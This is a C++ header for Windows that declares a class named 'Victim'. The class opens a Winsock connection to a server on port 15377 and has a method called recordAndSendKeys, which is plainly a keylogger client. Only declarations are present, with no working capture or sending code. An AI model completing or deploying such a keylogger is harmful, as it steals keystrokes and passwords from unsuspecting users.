#pragma once
#include <iostream>
#include <Winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <string>

#define ACTIVE_PROMISE_CODE -32767

class Victim {
private:
	WSADATA	_wsaData;
	sockaddr_in _addr;
	SOCKET _connection_socket;
	int _connection_port = 15377;
	std::string _target_ip_addr;

public:
	Victim(std::string target_ip_addr = "127.0.0.1");

	int connectToServer();
	void recordAndSendKeys();
};
